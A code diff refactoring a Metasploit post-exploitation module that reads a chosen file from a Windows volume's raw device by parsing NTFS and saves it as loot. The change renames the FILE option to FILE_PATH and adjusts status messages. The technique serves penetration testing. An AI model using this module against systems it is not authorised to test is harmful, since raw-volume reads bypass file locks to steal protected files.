@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Post
     ))
     register_options(
       [
-        OptString.new('FILE', [true, 'The FILE to retreive from the Volume raw device', nil])
+        OptString.new('FILE_PATH', [true, 'The FILE_PATH to retreive from the Volume raw device', nil])
       ], self.class)
   end
 
@@ -42,8 +42,8 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    file = datastore['FILE']
-    drive = file[0, 2]
+    file_path = datastore['FILE_PATH']
+    drive = file_path[0, 2]
 
     r = client.railgun.kernel32.CreateFileA("\\\\.\\#{drive}", "GENERIC_READ", "FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE",
                                             nil, "OPEN_EXISTING", "FILE_FLAG_WRITE_THROUGH", 0)
@@ -56,11 +56,12 @@ class Metasploit3 < Msf::Post
     print_status("Successfuly opened #{drive}")
     begin
       fs = Rex::Parser::NTFS.new(self)
-      print_status("Trying gather #{file}")
-      data = fs.file(file[3, file.length - 3])
-      file_name = file.split("\\")[-1]
+      print_status("Trying gather #{file_path}")
+      path = file_path[3, file_path.length - 3]
+      data = fs.file(path)
+      file_name = file_path.split("\\")[-1]
       stored_path = store_loot("windows.file", 'application/octet-stream', session, data, file_name, "Windows file")
-      print_status("Saving file : #{stored_path}")
+      print_good("Saving file : #{stored_path}")
     rescue ::Exception => e
       print_error("Post failed : #{e.backtrace}")
     ensure
